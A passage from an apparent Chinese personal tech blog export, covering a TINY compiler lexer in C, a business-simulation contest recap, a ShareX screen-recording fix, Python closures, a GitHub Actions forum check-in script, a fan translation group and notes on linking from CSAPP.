开始状态为START，终止状态为DONE。从START状态转移到下一个状态，只需要判定下一个读入的字符即可。 ERROR从图中可以看到，没有将词法错误ERROR单独作为一个状态来参与状态转移。接下来我们考虑发生ERROR的两种情况： 读入的第一个字符不是{、数字、字母、:以及TINY允许的运算符，则当前字符发生ERROR。 读入的第一个字符是:，但是第二个字符不是=，则上一个字符(:)发生ERROR。 Code1. 1234567891011else{ switch (c) { ... default: state = DONE; currentToken = ERROR; break; } } save此时为默认值true，将当前读入的（错误）字符保存以备输出 2. 12345678910case INASSIGN: state = DONE; if (c == '=') currentToken = ASSIGN; else { /* backup in the input */ ungetNextChar(); save = FALSE; currentToken = ERROR; } 若进入INASSIGN后（即读入:后），读入的字符不是=，发生了错误。 调用ungetNextChar()回退一个字符，令该字符参与下一轮的扫描。 save置为false，因为发生错误的是前一个字符:，而不是当前读入的字符。 Lexeme从示例图的预期输出以及util.c中的printToken()函数可知： 当词法单元类型为Reserved Words, ID, NUM或ERROR时，需要输出其对应的词素。因此在编写程序时，当遇到这几种词法单元，需要将读入的字符逐个保存，以便在到达DONE状态时输出。 Code12/* lexeme of identifier or reserved word */char tokenString[MAXTOKENLEN + 1]; 定义了一个名为tokenString的字符数组，用来保存上述情况下的词素。 1int tokenStringIndex = 0; 每一轮扫描会将字符数组的索引置零，以便保存新的词素。 123456if (state == DONE){ tokenString[tokenStringIndex] = '\\0'; if (currentToken == ID) currentToken = reservedLookup(tokenString);} 每一轮扫描结束在字符数组结尾加上终止符\\0，因为本轮保存的字符串长度可能小于上一轮保存的字符串长度，这样做可以避免上一轮保存的字符串影响这一轮的输出。 12/* flag to indicate save to tokenString */int save; 定义了一个整型变量save（实际当作布尔型用），用来指示当前读入的字符是否需要保存到tokenString。在每一轮循环的开始，即每读入一个新的字符后，save都被置为true，默认要保存该字符。 12if ((save) &amp;&amp; (tokenStringIndex &lt;= MAXTOKENLEN)) tokenString[tokenStringIndex++] = (char)c; 每一轮循环的尾部，如果save为true，将当前读入的字符保存到tokenString尾部。 实际上，只有进入INID、INNUM、INASSIGN或读入的字符非预期时，才需要保存读入的一串字符。下面我们逐个情况讨论： 进入INID 12else if (isalpha(c)) state = INID; 从START转移到INID时，仅仅转移状态，save仍为默认值true 123456789case INID: if (!isalpha(c)) { /* backup in the input */ ungetNextChar(); save = FALSE; state = DONE; currentToken = ID; } break; 进入INID后，当且仅当读入非字母时扫描结束。此时调用ungetNextChar()函数回退一个字符，令该字符参与下一轮的扫描。save置为false表示当前读入的字符不是该轮扫描所得词素的一部分。 进入INNUM 实现方法与情况1一致 在前文讨论ERROR时已给出 在前文讨论ERROR时已给出 Reserved WordsReserved Words和ID的区别在于：前者由TINY语言预定义，后者由程序员自定义。因此，不严谨地说，Reserved Words也是一种ID。这样，我们可以很自然地将Reserved Words与ID的扫描合并。 具体来说，当读入第一个字符为字母的时候，进入INID状态。在遇到非字母字符时才能转移到DONE状态，在这之前我们都无法确认读入的字符串（即词素）是否是Reserved Words。因此在INID状态期间我们将二者一视同仁，而在转移到DONE状态后对二者进行区分。换句话说，判断读入的词素是否是Reserved Words。 前文说到，当词法单元类型为Reserved Words或ID（亦即进入INID状态）时，我们需要将读入的词素保存。我们在一个包含所有Reserved Words键值对的表进行查找匹配，若保存的词素与表中的词素相同，则返回相应的词法单元，否则表明该词素对应的词法单元为ID。 Code123456/* lookup table of reserved words */static struct{ char *str; TokenType tok;} reservedWords[MAXRESERVED] = {{\"if\", IF}, {\"then\", THEN}, {\"else\", ELSE}, {\"end\", END}, {\"repeat\", REPEAT}, {\"until\", UNTIL}, {\"read\", READ}, {\"write\", WRITE}}; 定义了一个关键字的字典。 123456if (state == DONE){ tokenString[tokenStringIndex] = '\\0'; if (currentToken == ID) currentToken = reservedLookup(tokenString);} 当一轮扫描结束时，如果读入的词素被判定为ID（即该轮扫描经过了INID到DONE的状态转移），则在关键字字典中查找该轮保存的词素。如果查找到，返回相应的词法单元类型；如果未找到，返回ID。","categories":[{"name":"项目","slug":"项目","permalink":"https://blog.beacox.space/categories/%E9%A1%B9%E7%9B%AE/"}],"tags":[{"name":"编译原理","slug":"编译原理","permalink":"https://blog.beacox.space/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"}]},{"title":"EOVS——企业运营仿真赛参赛记录","slug":"eovs","date":"2023-01-11T09:47:50.000Z","updated":"2023-01-11T09:47:50.000Z","comments":true,"path":"posts/eovs/","link":"","permalink":"https://blog.beacox.space/posts/eovs/","excerpt":"去年12月中旬随队参加了第十二届上海市大学生工程实践与创新能力大赛——企业运营仿真赛项，获得了特等奖，也是我在乏善可陈的大学生活中拿到的第一个市级奖项。前段时间忙于“补天”（预习期末科目）没有更新，2023的第一篇文章就从这项比赛着笔吧。","text":"去年12月中旬随队参加了第十二届上海市大学生工程实践与创新能力大赛——企业运营仿真赛项，获得了特等奖，也是我在乏善可陈的大学生活中拿到的第一个市级奖项。前段时间忙于“补天”（预习期末科目）没有更新，2023的第一篇文章就从这项比赛着笔吧。 什么是EOVS？EOVS，又称企业运营仿真赛，是商赛的一种。竞赛内容引用原文： 参赛队员组建经营团队，每个团队分设总经理、财务总监、生产总监、营销总监4个岗位，需要创建一家生产制造型企业，模拟该企业两年八个季度的经营过程。涉及公司创建、材料采购、生产运营、市场营销、财务管理等相关企业经营活动。在企业运营过程中，竞赛团队应充分考虑企业的外部环境和企业内部运营状况，结合竞争对手情况，制定科学合理的企业运营策略，管理企业运营风险，实现企业利润最大化。 该赛项的组织机构是在教育部工程训练竞赛组委会领导下成立的企业运营仿真赛项组委会。不难看出，赛事的含金量远比不上著名的贝恩杯、奥纬杯、华为财务精英挑战赛等，但在全国范围内还是有一定热度的。另外，引用中国大学生工程实践与创新能力大赛官网： 中国大学生工程实践与创新能力大赛是列入《教育部评审评估和竞赛清单（2021年版）》（教政法厅函(2021)2号）的重要赛事。 亦即是说这是一项被教育部认可的比赛。抛开功利去谈这项比赛的话，我更愿意称其为一款游戏，一款模拟经营类游戏、倾向于协作的团队游戏。打完一局标准、完整的比赛大概需要4-5个小时，每一次打训练赛都像是酣畅淋漓地玩了一场烧脑的策略游戏。 为什么会参加EOVS？众所周知，我是打工人工科生，商赛的名头对我来说没什么吸引力。大一上学期时（2021年秋）认识了个朋友，挺社牛的，拉着我参加企业运营仿真赛的校内赛。当时挺闲的，再加上第一名的队伍有1000元奖金（平摊下来每个人250……，奇怪的数字，但是用来好好吃一顿不香吗），就一起报名参加了。 参赛经历校内赛夺魁接着说校内赛，当时报名的队伍有20多支，正式比赛前举办了两次友谊赛，其实对于很多队伍来说就是训练赛了，毕竟一半以上的队伍都是第一次参加这项比赛。参赛选手倒是来自各个学院、各个专业，也有被我们视作一号种子的、由经管学院学长学姐组成的队伍。我们由于时间原因只参加了一次训练赛。到了正式比赛的时候，分成了两组比赛——幸运的是，一号种子队伍和我们分在了两组。虽然说我们只参加了一次训练赛，实际上我们查阅了许多资料，做足了准备。到了赛场上发现有些组连计算用的Excel表格都没有（重要道具，后面会讲），导致他们预期的利润和实际偏差太大，早早地就破产出局了。比赛到一半的时候我们的动态排名还是第三，但由于前期高额的研发投入让我们的产品有明显的质量优势，在最后两季度我们凭借高价、高销量挣得更多净利润，最终排名组内第一。由于分了两组，所以第一只有500元奖金了（哭），赛后就只能在食堂吃了庆功宴。 知翰杯“百团大战”惨遭滑铁卢校内赛拿到组内第一之后，我们的心态产生了一些变化——不再只是“重在参与”了，而是争得更高级别的奖项。“百团大战”是2022年暑假举办的一次全国性企业运营仿真赛，其实那时距离我们参加校内赛已经半年多了，水平基本上可以说是没有提升。因为疫情原因我们甚至不知道这项赛事能否举办，因此只是在开赛前几个星期训练了几次。另外，这项赛事的低含金量导致它在我们学校的受重视程度比较低，我们没有像很多学校那样接受培训。这次比赛是分赛区举办的，华东赛区参赛省份有江苏、浙江、上海、安徽，规模和选手实力都和校内赛时不可同日而语。比赛采用分组积分制，具体前几名晋级我也记不大清了。只记得参赛的队伍风格异常凶悍，完全不按套路来，我们打的3场比赛全部以破产告终，最快的一次甚至第一个季度就破产了。一分未得，在意料之外，也在情理之中——的确是技不如人。 主场作战，有惊无险第十二届上海市大学生工程实践与创新能力大赛由我们学校承办，也就是说我们这次是在主场作战。不巧的是比赛时疫情管控刚刚放开，许多参赛选手都阳了或者回家了，导致有几组队伍退赛了，包括我们学校校内赛在另一组夺冠的队伍。因此我们成了该赛项的主场独苗，压力突然就增大了。我们队伍也只来了3个人，阳了一个。但和“百团大战”那次不同，这次我们研究了国奖选手的打法、深入剖析了规则、熟练掌握了Excel的制作与使用、制定了详细的策略，当然最重要的是我们参加了多次训练赛。可能因为是市级赛事大家比较保守，场上近二十支队伍采取了同样的策略，不存在总体策略的优劣，想要获胜就全靠比赛过程中的临场反应了。比赛中期开始有队伍制定低价破坏市场平衡，我们及时作出反应调低价格才避免了破产。在第5季时我们的季度排名已经进入前5，并且势头大好。不过之前说的社牛朋友紧张了，填错产品价格，导致我们在某个市场的销量和占有率暴跌，优势一去不复返，季度排名掉出前10。我们再次做出及时的调整，制定更低的产品价格，采用“薄利多销”的方案，最终在比赛结束前挽大厦于将倾，挤进了特等奖的行列。BTW，貌似其他特等奖队伍基本都有来自于商学院的选手。 我获得了什么？ 团队协作能力这是我觉得最重要的一点。其实这支队伍里我最开始也就认识那一个人，但是大家的目标是一致的，因此不存在有人摆烂的情况——这是团队协作的基础。这项比赛对于参赛的大多数队伍来说，都需要考虑分工，如何让合适的人做合适的工作，这是一门学问。如何组织大家训练、如何在比赛过程中形成统一的意见、如何有效地沟通……这些都是十分重要的技能。 处理困境的能力赛事官网这样写道： 通过竞赛，推进虚拟仿真实验教学在创新创业教育中的落地应用。参赛队员在模拟经营实践中，培养其创新精神，创业能力，提升学生在复杂条件下如何做出科学决策的能力，学会如何在困境中生存发展的企业家精神，形成如何建立团队、组织团队实现目标的能力。通过竞赛，全面提高学生发现问题、解决问题、综合分析问题能力；锻炼学生沟通协作、交流应变能力；对学生逻辑思维、开拓创新等综合能力都有一定的锻炼和提升。 或许我以后当不了企业家，但是在困境中生存发展永远是人生的必修课之一。况且未来谁人可知，万一将来某日我所学到的企业运营本领真派上用场了呢？ 当然，还有些我没获得但其他人可能获得的。比如在很多学校，该赛事拿国奖是有保研加分的。 如何上手？ 阅读比赛规则前往官网熟悉比赛规则 观看B站视频Up🐖推荐： O流砂O（入门） 冰桓（制表） 科韵工作室（进阶） 网上找比赛群进行训练网上搜索EOVS训练赛QQ群，有些群经常会有比赛，可以先用别人的表格（我的表格放在文章最后） 练习制表 下图是我自己制作的表格 自制表格 比赛中有非常多的数据要计算，如果自己用计算器算非常耗时而且正确率难以保证。一般来说，省级及以上的比赛都是要求不能使用现成表格的，也就是说如果想用表格就必须在现场制作。如果不是熟练掌握Excel公式及赛事规则的话，短时间内很难现场制作出这样一张表格，因此平时需要加以练习（制表是我的任务之一，所以我深有体会)。 一些经验B站和知乎有很多国奖大佬，可以去看他们的视频和文章或礼貌讨教。我的水平远不及他们，我的一些经验也是从大佬们那里学来的，仅供参考。 制表时未必要完全按照规则给的公式敲，有一些简化的公式 人工费用=计划生产量*1.4 生产设备价值=运营状况表下季实际产能*10 生产线折旧=上一季生产设备价值*10% 单季买原材料，双季还款单数季度购买两季度的原材料，几乎是约定俗成的规矩。根据供需关系，如果你在双数季度购买原材料，价格会更高。由于单数季度购买原材料，所以没有足够的现金还款，双数季度可以根据实际资产负债比、利息等考虑还款。 前期所有者权益越接近150w的整数倍越好所有者权益每增加150w可以让你有资格多购买1条生产线，假如你在2，3季度时生产线就比别人少2，3条，那么利滚利滚利，差距会越来越大，所以需要计算下季度理论上能达到的所有者权益。但是并不是所有者权益比预期高得越多越好，例如下一季度想要购买3条生产线，则需要有450w权益，将决策输入表格后发现达到520w，那么可以将这多余的70w花一部分在研发、营销等地方，这样收益才能最大化。因此，最理想情况是前期每次比要卡到的所有者权益高出几万到十几万。 注意3市场队伍3市场队伍会放弃一个市场，对于4市场打法的选手来说，3市场选手放弃的这个市场就是最好的突破口，在这个市场能够用更低的营销卖出去更多、更贵的产品。 第5季度高营销因为根据市场发展规律，第6季度市场往往会缩水。但此时又是购买生产线最多的季度，产量暴增，要想将产品卖光，必须提前用营销打开市场，提高市场占有率，才能分得更大的蛋糕。第5季度的决策可以很大程度上决定这场比赛的走向。 平衡营销和研发投入根据赛事介绍，营销和研发都存在边际递减效应。尽管研发的优势在当季度很难体现出来，但是到了比赛后期，如果品牌好、质量差，投入高营销的效果会很差，后期比拼的就是前中期的积累。一味地投入营销可能会让你在前中期占尽优势，但后期质量差导致的市场占有率降低会让你损失非常多净利润。 先练好8+2，四十场打法我们在所有正式比赛里都采用8+2，四市场打法，因为这种打法最为稳妥但又不失机遇。当有了一定的场数积累后再去尝试其他激进的打法，如7+3，8+3以及三市场打法。 EOVS表格及笔记仓库EOVS-excel-notehttps://github.com/BeaCox/EOVS-excel-note","categories":[{"name":"生活","slug":"生活","permalink":"https://blog.beacox.space/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"竞赛","slug":"竞赛","permalink":"https://blog.beacox.space/tags/%E7%AB%9E%E8%B5%9B/"}]},{"title":"冬至安康","slug":"winter-solstice","date":"2022-12-22T09:54:54.000Z","updated":"2022-12-22T09:54:54.000Z","comments":true,"path":"posts/winter-solstice/","link":"","permalink":"https://blog.beacox.space/posts/winter-solstice/","excerpt":"春生冬至时，祝各位博友冬至安康！","text":"春生冬至时，祝各位博友冬至安康！ 自己设计的冬至海报","categories":[{"name":"生活","slug":"生活","permalink":"https://blog.beacox.space/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"设计","slug":"设计","permalink":"https://blog.beacox.space/tags/%E8%AE%BE%E8%AE%A1/"},{"name":"海报","slug":"海报","permalink":"https://blog.beacox.space/tags/%E6%B5%B7%E6%8A%A5/"},{"name":"节日","slug":"节日","permalink":"https://blog.beacox.space/tags/%E8%8A%82%E6%97%A5/"}]},{"title":"如何解决ShareX录屏时光标位置发生偏移的问题","slug":"sharex-cursor","date":"2022-12-03T12:16:04.000Z","updated":"2022-12-03T12:16:04.000Z","comments":true,"path":"posts/sharex-cursor/","link":"","permalink":"https://blog.beacox.space/posts/sharex-cursor/","excerpt":"ShareX是我的主力截图工具，因为它开源且功能强大。但是实际使用时，其录屏功能会出现光标显示位置与实际位置存在偏移的问题，这十分影响使用体验，通过搜索软件仓库issues等方式，我总结了解决这一问题的方法。","text":"ShareX是我的主力截图工具，因为它开源且功能强大。但是实际使用时，其录屏功能会出现光标显示位置与实际位置存在偏移的问题，这十分影响使用体验，通过搜索软件仓库issues等方式，我总结了解决这一问题的方法。 前言ShareX是适用于Windows平台的一款“拥有屏幕捕捉、文件分享等功能的生产力工具”。其官网地址如下： ShareX - The best free and open source screenshot tool for Windowshttps://getsharex.com/ 对于我这样的博主来说，ShareX最吸引人的地方是它不仅可以满足截图需要，并且可以帮助我完成处理图片（如增加阴影和水印）、将图片上传至图床并复制链接到剪切板等一系列工作，帮助我完善了博客写作的工作流。如果有小伙伴想要上手ShareX，可以参考少数派的这篇文章： 一个软件，满足你所有的截图需求https://sspai.com/post/43937 当然，没有一个软件是完美的。我使用的是写下此文时ShareX最新版本14.1，按照录屏默认配置，在使用ShareX录屏时，产生了光标位置偏移的问题： 问题演示 问题起因ShareX的屏幕捕捉器视频源默认使用screen-capture-recorder，在使用该视频源录屏时，对屏幕的缩放有严格要求，否则就会出现光标偏移的问题。 先检查你的视频源是否使用screen-capture-recorder，点击动作设置-&gt;屏幕录制-&gt;屏幕录制选项，若在4所指之处，你的选择和图中一致，那么本文所记录的解决方案应该适合你。 检查 解决方案我的电脑系统版本是Win11 22H2，在其他windows系统下的配置略有不同但大体一致。 解决方案1（不推荐）打开系统设置，找到屏幕-&gt;缩放和布局-&gt;缩放，更改为100%。这样做十分影响屏幕的显示效果，尤其是在大尺寸屏幕上，因此并不推荐。 解决方案2回到ShareX中屏幕录制选项界面，将视频源改为GDI grab。 更改视频源 解决方案3（推荐）找到你的ShareX安装目录，右键点击ShareX.exe，选择属性-&gt;兼容性-&gt;更改高DPI设置，勾选替代高DPI缩放行为，缩放执行选择应用程序。如果你使用多Windows用户，并想为所有用户解决这个问题，请点击图示第4步下方的更改所有用户的设置，并进行相应的设置。 属性配置 3种方案对比 方案1很大程度地影响屏幕显示、影响日常使用 方案2可以很好地解决问题，但是录制效果不如方案3，录制过程中光标偶有闪烁 方案3不更改原本的屏幕缩放比例，录制效果好","categories":[{"name":"软件","slug":"软件","permalink":"https://blog.beacox.space/categories/%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://blog.beacox.space/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"},{"name":"ShareX","slug":"ShareX","permalink":"https://blog.beacox.space/tags/ShareX/"}]},{"title":"谈谈闭包","slug":"closure","date":"2022-11-10T13:43:11.000Z","updated":"2022-11-10T13:43:11.000Z","comments":true,"path":"posts/closure/","link":"","permalink":"https://blog.beacox.space/posts/closure/","excerpt":"在学习JS的过程中，我遇到了闭包这个概念，当时并没有在意。直到最近我开始自学python，在廖雪峰老师的python教程中又一次看到了这个名词，我才意识到闭包其实是一个重要的概念，或者说特性，许多高级语言支持闭包（比如近些年比较火的Go语言）。于是我查看了相关文档、教程，打算谈谈我对闭包的一些认识。","text":"在学习JS的过程中，我遇到了闭包这个概念，当时并没有在意。直到最近我开始自学python，在廖雪峰老师的python教程中又一次看到了这个名词，我才意识到闭包其实是一个重要的概念，或者说特性，许多高级语言支持闭包（比如近些年比较火的Go语言）。于是我查看了相关文档、教程，打算谈谈我对闭包的一些认识。 闭包的定义闭包有许多不同的定义，个人认为最简洁而达意的是MDN对于闭包的定义： 闭包（closure）是一个函数以及其捆绑的周边环境状态（lexical environment，词法环境）的引用的组合。换而言之，闭包让开发者可以从内部函数访问外部函数的作用域。 词法环境维基百科这样描述闭包中的词法环境： 环境里是若干对符号和值的对应关系，它既要包括约束变量（该函数内部绑定的符号），也要包括自由变量（在函数外部定义但在函数内被引用），有些函数也可能没有自由变量。 简单来说，词法环境包含两部分： 环境记录：存储符号-值对 对外部环境的引用：对父级词法环境的引用。 也就是说，一个函数的词法环境包含了在函数中的符号定义和函数外部的词法环境。考虑如下python代码： 1234567def init(): name = \"BeaCox\" def displayName(): greeting = \"Hello\" print(greeting+', '+name) displayName()init() displayName函数的词法环境包含了环境记录（greeting的符号-值对）以及对外部环境的引用（name和displayName的符号-值对），这也就是在displayName函数中可以访问name变量的原因。执行displayName函数，其实就是创建了一个闭包。 使用闭包看完上面的例子，好像有点迷糊了：这不就是“内层作用域可以访问外层作用域的变量”吗？C++不支持闭包，不也能完成上面的工作吗？这是因为上面的例子并没有展示出闭包函数与词法环境捆绑的特性。将上面的代码稍加改动： 12345678def init(): name = \"BeaCox\" def displayName(): greeting = \"Hello\" print(greeting+', '+name) return displayNameoutsideDisplay=init()outsideDisplay() 这段代码与上面不同的地方在于，displayName函数并不在init函数中执行，而是作为返回值，在init函数外部，有一个outsideDisplay接收了这个返回值。如果我们从C++的思想来考虑这段代码，会发现：在init函数执行完后，局部变量name已经被回收，这时候outsideDisplay中name变量是没有被定义的，这段代码应该不能正常运行。然而，我们运行这段python程序后会发现，终端正常输出Hello, BeaCox，这就是闭包的魔力！ 这段程序之所以正常运行的原因，就是python中返回函数会形成闭包。闭包是由函数以及声明该函数的词法环境组合而成的。该环境包含了这个闭包创建时作用域内的任何局部变量。在本例子中，outsideDisplay 是执行 init 时创建的 displayName 函数实例的引用。displayName 函数和其捆绑的词法环境（变量 name 存在于其中）的引用形成了一个闭包，因此init函数执行完毕后，该词法环境没有消失，变量name也没有被回收。因此，当 outsideDisplay 被调用时，变量 name 仍然可用，程序能够正确运行。 闭包的用途模拟公有成员函数对私有变量的操作读完上述代码不难发现，outsideDisplay函数在init函数外部调用，但却访问到了init函数内部的变量。这与C++中，调用类的公有成员函数来操作类的私有变量非常相似。与C++不同，python不存在严格意义上的私有变量，python通过以双下划线为开头来命名变量的方式，实现的是一种伪私有变量，它不应该被从外部访问，而不是不能被从外部访问。python、JavaScript等不支持严格私有变量的语言可以通过创建闭包来模拟公有成员函数对私有变量的操作 创建一个生命周期极长的局部变量观察上述例子，outsideDisplay函数可以继续重复运行，直到整个程序终止。也就是说name变量直到程序运行结束之前，都一直存在于内存中。听起来貌似很像全局变量，但这个变量却是一个局部变量。仅这个程序而言，这个变量只能被outsideDisplay函数和init函数访问。 闭包可能导致的问题内存泄漏 内存泄漏（Memory Leak）是指程序中已动态分配的堆内存由于某种原因程序未释放或无法释放，造成系统内存的浪费，导致程序运行速度减慢甚至系统崩溃等严重后果。 上文提到，闭包可以创建一个生命周期极长（直到程序运行结束前始终留存在内存中）的变量，如果这样的变量过多，就会导致程序运行速度减慢甚至系统崩溃。 在循环中创建闭包导致意料之外的错误廖雪峰老师的python教程中给出了一个这样的例子： 123456789def count(): fs = [] for i in range(1, 4)://i从1到3 def f(): return i*i fs.append(f) return fsf1, f2, f3 = count() 这段程序的期望目标是f1, f2, f3分别返回1，4，9。实际返回9, 9, 9。这是因为每个f()函数捆绑外部词法环境中的i是对i的引用，在return fs之前，i已经变成3了，因此每个f()函数返回的都是3*3。 因此，要尽量避免在循环中创建闭包。如若必需，务必要谨慎！","categories":[{"name":"前端","slug":"前端","permalink":"https://blog.beacox.space/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://blog.beacox.space/tags/javascript/"},{"name":"python","slug":"python","permalink":"https://blog.beacox.space/tags/python/"}]},{"title":"基于GitHub Actions的看雪论坛自动签到，可选推送与否","slug":"pediy-CheckIn","date":"2022-09-19T23:00:36.000Z","updated":"2022-09-19T23:00:36.000Z","comments":true,"path":"posts/pediy-CheckIn/","link":"","permalink":"https://blog.beacox.space/posts/pediy-CheckIn/","excerpt":"","text":"看雪论坛称得上是国内较好的安全论坛了。不过要1k雪币（论坛虚拟币，新用户几乎都可以获得220及以上）才可以升级为正式会员。临时会员有诸多限制，包括不能查看『WEB安全』版块等。对于我这种想白嫖的安全小白来说，唯一的方法就是每天签到随机获得1-10枚雪币。但是我经常会忘记签到，这等到猴年马月？正好我最近正在学习JS，于是写了一个自动签到的脚本。当然，除了升级正式会员，雪币还有许多用处，所以对已经是正式会员的用户来说也还算有些用罢。 先上传送门： pediy-CheckInhttps://github.com/BeaCox/pediy-CheckIn 实现方法这个脚本的实现非常简单。 通过抓包可以发现，看雪论坛的签到是通过向https://bbs.pediy.com/user-signin.htm页面发送含Cookie的POST请求来实现的（也是绝大多数签到业务的设计逻辑），因此利用Axios库的API来向该页面发送请求，模拟用户签到。 签到完成后，将响应的数据赋值给一个对象，通过response.data.code和response.data.message来判断网络正常情况下，签到任务的三种可能情况。 code == 0 &amp;&amp; message = &lt;签到获得雪币数&gt; : 表示签到成功。推送消息显示`签到成功，获得${msg}雪币`。 code == -1 &amp;&amp; message == '您今日已签到成功' : 表示已经签到过，此处为重复签到。推送消息显示’您今日已签到成功’。 code == -1 &amp;&amp; message == '请先登录': 表示Cookie验证失败。打印错误并不推送消息 推送消息的功能利用pushplus提供的接口实现，因为比Server酱免费版限制少一些，当然后续可能会添加server酱等其他选项。同样是利用了Axios的库来向接口发送请求。可以参考pushplus文档中心 利用GitHub Actions，在GitHub提供的主机上用node运行js，通过crontab完成定时任务。 GitHub Actions在仓库60天以上没有任何活动时会被suspended（推迟），因此利用Keepalive Workflow来使工作流按期运行。 后续希望各位能帮我点一个star✨（理直气壮）由于这是我第一个js脚本，程序健壮性想必不甚好，欢迎大家提出issue和pr！","categories":[{"name":"项目","slug":"项目","permalink":"https://blog.beacox.space/categories/%E9%A1%B9%E7%9B%AE/"}],"tags":[{"name":"Actions","slug":"Actions","permalink":"https://blog.beacox.space/tags/Actions/"},{"name":"javascript","slug":"javascript","permalink":"https://blog.beacox.space/tags/javascript/"}]},{"title":"记录第一次参与美漫翻译","slug":"sp-translate","date":"2022-07-06T12:02:22.000Z","updated":"2022-07-06T12:02:22.000Z","comments":true,"path":"posts/sp-translate/","link":"","permalink":"https://blog.beacox.space/posts/sp-translate/","excerpt":"有点小兴奋。我终于也成了一名”烤肉man”。以前看美剧、美漫的时候片头字幕组给我的感觉就是：帅爆了。试想一下，你将自己喜欢看的剧翻译成中文，你的同好看的某一集就是你翻译的——SO DAMN COOL!","text":"有点小兴奋。我终于也成了一名”烤肉man”。以前看美剧、美漫的时候片头字幕组给我的感觉就是：帅爆了。试想一下，你将自己喜欢看的剧翻译成中文，你的同好看的某一集就是你翻译的——SO DAMN COOL! 关于我看美漫这件事虽然我的头像是炭治郎，但其实我平时看日漫真不多，我近几年看过的日漫简直屈指可数：《鬼灭之刃》、《咒术回战》，《国王排名》甚至只看了一点点。倒是看美漫看得还比较多，只不过没多少能拿来当头像的。能拿到台面上来说的有：Rick and Morty, Gravity Falls, Love,Death&amp;Robots。剩下的就不多说了，如果有美漫同好也可以私我。反正对我来说，看日漫是因为热血，看美漫是因为脑洞。可能喜欢看美漫是因为它能让我从固化的思维当中暂时抽离出来吧！ 烤肉的起因向看国外片子少的小伙伴们解释下，一般称没有翻译的外语片为生肉，有中文字幕的则叫做熟肉，而翻译过程就叫做烤肉。这件事的起因是我的一个好兄弟找到了这部动漫中文字幕组的账号，看到了他们发布的招新信息，他就加入了。后来他告诉我翻译工作频率很低、随缘，而且翻译测试很简单，我就跟着冲了。（果然easy，毕竟招新要求是初三以上即可 XD） 烤肉的经过严格来说，我做的并不能算烤肉的工作。这部动漫联手育碧等公司发布了三款游戏：真理之杖、完整破碎、手机毁灭者（看过动漫或者玩过游戏的小伙伴想必已经知道我说的是哪部动漫了，我翻译的是游戏演示视频，但我已经很满意了。 聊天记录 很多加群的新人都会问这样一个问题：“有ddl吗？”他们都会得到相同的有些意外的答案：“没有”。因为所有翻译全都是用爱发电、为爱发电。没有人会要求你完成多少翻译任务，没有人限定翻译时间；同样地，没有人会进群划水，也没有人领了任务迟迟不完成。另外，在烤肉的过程中，虽然有wiki可以参考，但是像这样一部梗满天飞的美漫仍旧是很难翻译的。有些梗可能十分冷门，因此翻译难度很大，但是没有谁会摆烂瞎翻。之前群里有一段关于某一缩写的含义的讨论，持续了好几天才得出结论。 一些感受加入翻译组不仅让我结识了一群该动漫的同好，也让我的翻译能力有了大幅度的提升。毕竟在大学里我的英语全靠高中的功底强撑着，我是不太可能主动学习英语的。但是我的确喜欢翻译，这是一种将地道的外国表达转换成够味儿的中文表达的过程，是多元文化的碰撞。当然，毋宁说是这让我理解更多梗、让我有一种平日里少有的自豪感。 其实这样的翻译工作跟博客创作倒是有些相似之处：一群同好聚集在一起做喜欢的事，充满热情和活力，一起讨论问题、解决问题、分享。当然，还有为爱发电。我认识的绝大多数博主创作博客的目的都不是为了盈利，毕竟做博客的盈利或许都很难比得上维护博客所耗费的时间、精力、财力。对了，对我来说这两个圈子还有一个共同点：那就是比我现在大学生活的圈子精彩得多。 最后放一张我翻译的片段吧！ image-20220706210344922 这是我第一次烤肉，因此很多表达翻译成中文自己都感觉怪怪的，希望能继续进步吧！还想参与下半年电影字幕的翻译呢嘿嘿","categories":[{"name":"生活","slug":"生活","permalink":"https://blog.beacox.space/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://blog.beacox.space/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}]},{"title":"《深入理解计算机系统》第7章：链接 阅读报告","slug":"csapp-7","date":"2022-07-01T07:50:32.000Z","updated":"2022-07-01T07:50:32.000Z","comments":true,"path":"posts/csapp-7/","link":"","permalink":"https://blog.beacox.space/posts/csapp-7/","excerpt":"这篇文章是阅读《深入理解计算机系统》第7章：链接后写下的，很多地方写得并不详细，也无法保证完全正确。主要是为了记录我学习链接相关知识的过程，仅供参考。","text":"这篇文章是阅读《深入理解计算机系统》第7章：链接后写下的，很多地方写得并不详细，也无法保证完全正确。主要是为了记录我学习链接相关知识的过程，仅供参考。 什么是链接？ 链接是将各种代码和数据片段收集并组合成为一个单一文件的过程，这个文件可被加载（复制）到内存并执行。 链接可以执行于编译时、加载时、运行时。 编译器驱动程序 大多数编译系统提供编译器驱动程序(compile driver)，它代表用户在需要时调用语言预处理器、编译器、汇编器和链接器。 用GNU编译系统构造程序时，我们调用GCC(GNU Compiler Collection)驱动程序。 GCC有几个常用的参数： 参数 功能 -c 将源文件编译成目标文件但不链接 -d 在执行过程中打印出所有的调试信息 -S 将源文件编译成汇编代码，不进行汇编和链接 -E 只对源文件进行预处理，不进行编译、汇编、链接 -o 指明输出文件名为file -g 打开调试开关，让编译的目标文件有调试信息 -O0, -O1, -O2, -O3 控制代码优化强度，-O3最强 举个例子 要通过上图源程序一步步构造成一个完全链接的可执行目标文件，需要以下几步： 每一步对应如下代码： 1234gcc -E -o main.i main.c # 预处理gcc -S -o main.s main.i # 编译as -o main.o main.s # 汇编ld -static -o prog main.o sum.o # 链接 可重定位目标文件如图所示是典型的ELF可重定位目标文件的格式。 ELF：Executable and Linkable Format(可执行可链接格式) ELF头以一个16字节的序列开始，前四个字节被称为魔数，用来确认文件类型；第5个字节表示ELF文件类型：0x1代表32位，0x2代表64位；第6个字节表示字节序：0x1代表小端法，0x2代表大端法；第7个字表示ELF的版本号，通常都是0x1；剩余的字节填充为0。ELF头剩下的部分包含帮助链接器语法分析和解释目标文件的信息。 夹在ELF头和节头部表之间的都是节。较为重要的节如下： 名称 内容 备注 .text 已编译程序的机器代码 .rodata read-only data。比如printf语句中的格式串 .data 已初始化的全局和静态变量 局部变量不在.data也不在.bss，保存在栈中 